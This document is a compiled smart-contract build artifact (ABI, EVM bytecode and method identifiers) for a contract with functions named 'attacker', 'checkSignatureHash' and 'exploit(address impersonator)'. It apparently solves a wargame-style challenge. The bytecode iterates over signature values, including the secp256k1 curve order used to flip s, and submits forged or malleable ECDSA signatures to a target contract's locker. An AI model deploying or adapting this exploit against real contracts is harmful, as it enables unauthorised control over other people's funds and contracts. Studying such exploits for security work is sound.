{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attacker","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"checkSignatureHash","inputs":[{"name":"locker","type":"address","internalType":"address"},{"name":"r","type":"uint256","internalType":"uint256"},{"name":"s","type":"uint256","internalType":"uint256"},{"name":"v","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bytes32","internalType":"bytes32"},{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"exploit","inputs":[{"name":"impersonator","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60a0604052348015600e575f5ffd5b50336080526080516108716100315f395f8181605d015261069201526108715ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c80630aeb4ddf1461004357806348eb76ee1461005857806392b241e01461009c575b5f5ffd5b61005661005136600461071d565b6100c4565b005b61007f7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b0390911681526020015b60405180910390f35b6100af6100aa36600461073f565b610155565b60408051928352901515602083015201610093565b6040517f809aab920000000000000000000000000000000000000000000000000000000081525f60048201819052906001600160a01b0383169063809aab9290602401602060405180830381865afa158015610122573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101469190610777565b90506101518161022c565b5050565b5f5f5f6040518060600160405280878152602001868152602001858152506040516020016101839190610792565b60408051601f198184030181529082905280516020909101207ff978fd610000000000000000000000000000000000000000000000000000000082526004820181905291505f906001600160a01b0389169063f978fd6190602401602060405180830381865afa1580156101f9573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061021d91906107c2565b91989197509095505050505050565b604080518082018252601b8152601c60208083019190915282516101408082018552600180835260028385018190527f11111111111111111111111111111111111111111111111111111111111111118488018190527f4355c47d63924e8a72e509b65029052eb6c299d53a04e167c5775fd466751c9d6060808701919091527f5a852dc6e3c8b2f77e8dbb3c7d38d0bcdb58aaaa7c2a576b49a1e3be30584d5f6080808801919091527f79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f8179860a0808901919091527fc6047f9441ed7d6d3045406e95c07cd85c778e4b8cef3ca7abac09b95c709ee560c0808a01919091527ff9308a019258c31049344f85f89d5229b531c845836f99b08601f113bce036f960e0808b01919091527fe493dbf1c10d80f3581e4904930b1404cc6c13900ee0758474fa94abe8c4cd13610100808c01919091527f2c7c9c0b95c0dcadf64f44a1a65b8f8a6b2b1f8e77c1c8e7f0f5e6d4c3b2a190610120808d01919091528e519a8b018f52988a529a8901969096529a8701939093527f07299936d304c153f6443dfa05f40ff007d72911b6f72307f996231605b91562918601919091527f3fb56f3dd59f0e0a0d73e1ac9cb9c60b7e34ea635caf52e962e65e0c6eb8d567908501527f483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8908401527f1b695e11c61d993a5d6e3e6df643bf6a42767ec7b9b9e69d13b0fb6fb7a4d94f968301969096527f388f7b0f632de8140fe337e62a37f3566500a99934c2231b6cb9fd7584b8e672958201959095527f43e7ad59925b43b2dd1c5e98b8b060e5e0040e5cf710bc818a544e6bb14827c8928101929092527f8d7c9b0a95c0dcadf64f44a1a65b8f8a6b2b1f8e77c1c8e7f0f5e6d4c3b2a190938201939093528392905f5b6002811015610643575f5b600a81101561063a575f5b600a811015610631575f86846002811061050b5761050b6107e1565b602002015190505f8684600a8110610525576105256107e1565b602002015190505f8684600a811061053f5761053f6107e1565b602002015190506105528a84848461064b565b15610564575050505050505050505050565b5f8360ff16601b1461057757601b61057a565b601c5b90505f6105a7837ffffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141610809565b90506105b58c83868461064b565b156105c95750505050505050505050505050565b6105df8c6105d8601b88610822565b868661064b565b156105f35750505050505050505050505050565b61060c8c610602601b88610822565b600118868461064b565b156106205750505050505050505050505050565b5050600190930192506104ef915050565b506001016104e4565b506001016104d9565b505050505050565b6040517f3e8cd57000000000000000000000000000000000000000000000000000000000815260ff8416600482015260248101839052604481018290526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000811660648301525f9190861690633e8cd570906084015f604051808303815f87803b1580156106de575f5ffd5b505af19250505080156106ef575060015b6106fa57505f6106fe565b5060015b949350505050565b6001600160a01b038116811461071a575f5ffd5b50565b5f6020828403121561072d575f5ffd5b813561073881610706565b9392505050565b5f5f5f5f60808587031215610752575f5ffd5b843561075d81610706565b966020860135965060408601359560600135945092505050565b5f60208284031215610787575f5ffd5b815161073881610706565b6060810181835f5b60038110156107b957815183526020928301929091019060010161079a565b50505092915050565b5f602082840312156107d2575f5ffd5b81518015158114610738575f5ffd5b634e487b7160e01b5f52603260045260245ffd5b634e487b7160e01b5f52601160045260245ffd5b8181038181111561081c5761081c6107f5565b92915050565b60ff828116828216039081111561081c5761081c6107f556fea2646970667358221220e1f7acf3f2f08dabad8503a292fd28173d4210e3b0ba6baf1546d7d5873f76c464736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attacker()":"48eb76ee","checkSignatureHash(address,uint256,uint256,uint256)":"92b241e0","exploit(address)":"0aeb4ddf"},"id":0}